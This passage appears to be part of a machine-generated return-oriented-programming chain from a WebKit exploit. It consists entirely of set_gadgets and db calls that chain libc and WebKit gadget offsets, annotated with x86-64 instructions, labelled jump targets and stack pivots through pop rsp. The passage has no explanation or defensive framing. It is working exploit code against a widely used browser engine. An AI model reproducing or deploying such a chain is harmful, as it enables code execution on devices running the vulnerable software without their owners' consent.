libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+14959219, //cmp rax, rcx ; sete al
webkit_base+8824269, //setle al
libc_base+269973, //movzx eax, al
libc_base+793877, //pop rsi
ropchain+133744, //L1786
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+133760, //L1788
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+133728, //L1787
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1787:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1786:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1788:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+133864, //L1792
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+133928, //L1794
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+133880, //L1790
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1792:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1790:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1791:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1793:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1794:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+11676600, //cmp rax, rsi ; sete al
libc_base+269973, //movzx eax, al
webkit_base+414627, //shl rax, 3
libc_base+793877, //pop rsi
ropchain+134040, //L1795+8
libc_base+547636, //add rax, rsi
libc_base+186490, //mov rax, [rax]
libc_base+793877, //pop rsi
ropchain+134032, //L1795
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+811575 //pop rsp
]);
//L1795:
db([0, 0]); // 0x0
set_gadgets([
ropchain+134056, //L1795+24
ropchain+135688, //L1789
libc_base+793877, //pop rsi
ropchain+134096, //L1796
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L1796:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1797:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+134200, //L1799
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+134216, //L1800
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1799:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1800:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+134368, //L1802
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+134400, //L1805
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+134384, //L1803
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+134352, //L1804
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1804:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1802:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1803:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1805:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+134472, //L1806
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+134488, //L1807
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1806:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1807:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+134648, //L1811
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+134616, //L1808
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+134600, //L1809
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1809:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1808:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1810:
db([24, 0]); // 0x18
set_gadget(libc_base+788575,); //pop rax
//L1811:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+134704, //L1812
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L1812:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+134808, //L1814
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+134840, //L1816
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+134824, //L1815
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1814:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1815:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1816:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+134912, //L1817
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+134928, //L1818
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1817:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1818:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+135024, //L1820
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+135008, //L1819
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1819:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1820:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+135104, //L1823
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1823:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1821:
db([10, 0]); // 0xa
set_gadget(libc_base+788575,); //pop rax
//L1822:
db([10, 0]); // 0xa
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+135256, //L1825
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+135272, //L1826
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+135240, //L1824
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1824:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1825:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1826:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+14959219, //cmp rax, rcx ; sete al
libc_base+389047, //setne al
libc_base+269973, //movzx eax, al
libc_base+793877, //pop rsi
ropchain+135440, //L1827
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+135456, //L1829
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+135424, //L1828
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1828:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1827:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1829:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+135592, //L1832
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+135608, //L1833
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+135560, //L1830
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1830:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1831:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1832:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1833:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+11676600, //cmp rax, rsi ; sete al
libc_base+389047, //setne al
libc_base+269973, //movzx eax, al
libc_base+793877, //pop rsi
ropchain+135680, //L1835
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1835:
db([0, 0]); // 0x0
//L1789:
set_gadgets([
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+135800, //L1836
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+135816, //L1838
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+135784, //L1837
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1837:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1836:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1838:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+135952, //L1841
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+135968, //L1842
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+135920, //L1839
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1839:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1840:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1841:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1842:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+11676600, //cmp rax, rsi ; sete al
libc_base+389047, //setne al
libc_base+269973, //movzx eax, al
libc_base+793877, //pop rsi
ropchain+136040, //L1844
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1844:
db([0, 0]); // 0x0
//L1736:
set_gadgets([
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+136160, //L1845
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+136176, //L1847
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+136144, //L1846
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1846:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1845:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1847:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+136280, //L1851
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+136328, //L1852
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+136296, //L1849
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1851:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1849:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1850:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1852:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+11676600, //cmp rax, rsi ; sete al
libc_base+269973, //movzx eax, al
webkit_base+414627, //shl rax, 3
libc_base+793877, //pop rsi
ropchain+136440, //L1853+8
libc_base+547636, //add rax, rsi
libc_base+186490, //mov rax, [rax]
libc_base+793877, //pop rsi
ropchain+136432, //L1853
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+811575 //pop rsp
]);
//L1853:
db([0, 0]); // 0x0
set_gadgets([
ropchain+136456, //L1853+24
ropchain+138752, //L1848
libc_base+793877, //pop rsi
ropchain+136496, //L1854
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L1854:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1855:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+136600, //L1857
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+136616, //L1858
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1857:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1858:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+136768, //L1860
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+136800, //L1863
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+136784, //L1861
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+136752, //L1862
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1862:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1860:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1861:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1863:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+136872, //L1864
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+136888, //L1865
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1864:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1865:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+137048, //L1869
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+137016, //L1866
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+137000, //L1868
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1868:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1866:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1867:
db([56, 0]); // 0x38
set_gadget(libc_base+788575,); //pop rax
//L1869:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+137152, //L1871
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+137136, //L1870
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1870:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1871:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+137232, //L1872
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L1872:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1873:
db([24, 0]); // 0x18
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+137336, //L1875
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+137352, //L1876
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1875:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1876:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+137424, //L1878
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+137440, //L1879
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1878:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1879:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+137584, //L1882
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+137552, //L1880
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+137568, //L1881
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1880:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1881:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1882:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+137672, //L1884
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L1883:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L1884:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+137760, //L1885
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L1885:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1886:
db([24, 0]); // 0x18
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+137864, //L1888
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+137880, //L1889
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1888:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1889:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+137984, //L1892
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+137968, //L1891
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L1891:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1892:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+138040, //L1895
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1895:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+138160, //L1897
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1897:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+138216, //L1899
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1899:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+865136, //mov [rax], cl
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+138360, //L1902
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+138328, //L1901
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1901:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1900:
db([56, 0]); // 0x38
set_gadget(libc_base+788575,); //pop rax
//L1902:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+138488, //L1904
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+138504, //L1905
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+138472, //L1903
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1903:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1904:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1905:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+138600, //L1906
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+138616, //L1907
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L1906:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1907:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+138728, //L1908
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+138712, //L1909
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L1909:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L1908:
db([0, 0]); // 0x0
set_gadgets([
libc_base+811575, //pop rsp
ropchain+140160, //L1910
//L1848:
libc_base+793877, //pop rsi
ropchain+138792, //L1911
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L1911:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1912:
db([24, 0]); // 0x18
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+138896, //L1914
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+138912, //L1915
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1914:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1915:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+139056, //L1919
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+139024, //L1917
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+139040, //L1918
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1917:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1918:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1919:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+139136, //L1920
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L1920:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1921:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+139240, //L1923
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+139256, //L1924
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1923:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1924:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+139408, //L1926
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+139440, //L1929
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+139424, //L1927
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+139392, //L1928
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1928:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1926:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1927:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1929:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+139536, //L1931
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+139520, //L1930
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1930:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1931:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575, //pop rax
//L1933:
ropchain+139640, //L1932
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+811575, //pop rsp
ropchain+140472, //L1934
//L1932:
libc_base+882884, //mov rax, rcx
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+139776, //L1935
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+139792, //L1937
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+139760, //L1936
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1936:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1935:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1937:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+139912, //L1939
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+139928, //L1940
webkit_base+7438103, //mov [rsi], rax
